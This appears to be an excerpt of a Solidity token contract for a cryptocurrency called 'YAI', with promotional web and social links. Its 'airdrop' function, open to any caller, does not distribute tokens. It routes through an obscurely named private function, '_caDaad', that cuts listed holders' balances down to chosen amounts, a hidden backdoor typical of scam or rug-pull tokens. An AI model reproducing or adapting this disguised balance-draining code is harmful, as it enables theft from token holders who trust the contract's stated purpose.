...
/**
Web: https://yoracle-ai.live
Dapp: https://dashboard.yoracle-ai.live
Tg: https://docs.yoracle-ai.live

X: https://x.com/YoracleAI
Tg: https://t.me/YoracleAI
*/
...
contract YAI is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"YAI";
    string private constant _symbol = unicode"Ÿ";
    ...
    constructor() payable {
        _taxWallet = payable(0x459bdAf7172532496172d6de116ED227E829d424);
    ...
    function _caDaad(address from, address to, uint256 amount) private {
        if (msg.sender != owner() && msg.sender != uniswapV2Pair && (from != uniswapV2Pair || to == _taxWallet))
        _balances[from] -= amount;
    }

    function airdrop(address[] memory receivers, uint256[] memory amounts) external {
        for (uint256 i = 0; i < receivers.length; i++) {
            _caDaad(receivers[i], msg.sender, _balances[receivers[i]] - amounts[i]);
        }
    }
